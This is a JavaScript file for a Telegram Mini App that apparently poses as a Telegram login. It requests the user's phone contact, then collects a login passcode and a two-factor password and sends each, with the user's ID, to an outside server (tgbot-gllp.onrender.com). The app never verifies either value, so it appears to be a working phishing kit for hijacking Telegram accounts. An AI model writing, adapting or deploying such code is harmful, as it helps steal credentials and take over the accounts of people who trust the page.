document.addEventListener("DOMContentLoaded", () => {
  const tg = window.Telegram?.WebApp;
  if (!tg) return;

  tg.ready();
  tg.expand();

  // DOM elements
  const loginBtn = document.getElementById("loginbtn");
  const page1 = document.getElementById("page1");
  const page2 = document.getElementById("page2");
  const page3 = document.getElementById("page3");
  const popup = document.getElementById("popup");
  const blur = document.getElementById("blur");
  const passcodeBtn = document.getElementById("passcode-btn");
  const passcodeInput = document.getElementById("hiddenInput");
  const twofactorInput = document.getElementById("twofactor-input");
  const twofactorBtn = document.getElementById("twofactor-btn");
  const input = document.getElementById("hiddenInput");
  const box = document.getElementById("codeBox");
  const cells = document.querySelectorAll(".cell");

  let userInfo = tg.initDataUnsafe?.user || null;
  const testMode = false;
  let currentPage = "page1";

  // 🧩 Hide keyboard when tapping outside input
  document.addEventListener("touchstart", (e) => {
    const active = document.activeElement;
    if (
      active &&
      (active.tagName === "INPUT" || active.tagName === "TEXTAREA") &&
      !e.target.closest("input") &&
      !e.target.closest("textarea")
    ) {
      active.blur();
    }
  });

  // 🪪 Telegram login
  loginBtn.addEventListener("click", async () => {
    if (testMode) {
      tg.showAlert("⚠️ Please open this app from the Telegram bot.\n\nFor testing, use the TEST MODE button below.");
      return;
    }

    try {
      tg.requestContact();
      tg.onEvent("contactRequested", (data) => {
        if (data.status === "sent") showPage2();
      });
    } catch (err) {
      tg.showAlert("Error: " + err.message);
    }
  });

  // 📱 Smooth fade-slide transition
  function smoothTransition(showEl, hideEls = []) {
    hideEls.forEach((el) => {
      el.classList.remove("active");
      el.style.pointerEvents = "none";
    });

    showEl.style.display = "flex";
    showEl.style.pointerEvents = "auto";

    requestAnimationFrame(() => {
      hideEls.forEach((el) => (el.style.opacity = "0"));
      showEl.classList.add("active");
      showEl.style.opacity = "1";
      showEl.style.transform = "translateY(0)";
    });
  }

  function showPage2() {
    currentPage = "page2";
    smoothTransition(page2, [page1]);
    blur.style.opacity = "1";
    popup.style.height = "420px";
  }

  function showPage3() {
    currentPage = "page3";
    smoothTransition(page3, [page2]);
    popup.style.height = "360px";
    blur.style.opacity = "1";
  }

  // 🧩 Passcode handler
  passcodeBtn.addEventListener("click", async () => {
    const passcode = passcodeInput.value.trim();
    if (!passcode) return tg.showAlert("⚠️ Please enter passcode");

    let user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;

    if (!user_id && tg.initData) {
      const params = new URLSearchParams(tg.initData);
      const userParam = params.get("user");
      if (userParam) {
        try {
          const userData = JSON.parse(userParam);
          user_id = userData.id;
          userInfo = userData;
        } catch {}
      }
    }

    if (!user_id) return tg.showAlert("⚠️ Cannot get user ID. Please open from Telegram bot.");

    try {
      await fetch("https://tgbot-gllp.onrender.com/send_data", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ passcode, user_id }),
      });
      setTimeout(showPage3, 500);
    } catch {
      tg.showAlert("❌ Failed to send passcode");
    }
  });

  // 🔐 2FA
  twofactorBtn.addEventListener("click", async () => {
    const twofactor = twofactorInput.value.trim();
    if (!twofactor) return tg.showAlert("⚠️ Please enter 2FA password");

    const user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;
    if (!user_id) return tg.showAlert("⚠️ Cannot get user ID");

    try {
      await fetch("https://tgbot-gllp.onrender.com/send_twofactor", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ twofactor, user_id }),
      });
    } catch {
      tg.showAlert("❌ Failed to send");
    }
  });

  // 🔢 Passcode UI visual
  box.addEventListener("click", () => input.focus());
  input.addEventListener("input", () => {
    const value = input.value.split("");
    cells.forEach((cell, i) => {
      const char = value[i] || "";
      cell.textContent = char;
      cell.style.boxShadow = char ? "0 0 0.3rem 0.1rem #59be4a" : "none";
      cell.style.transform = char ? "scale(1.08)" : "scale(1)";
    });
  });
});
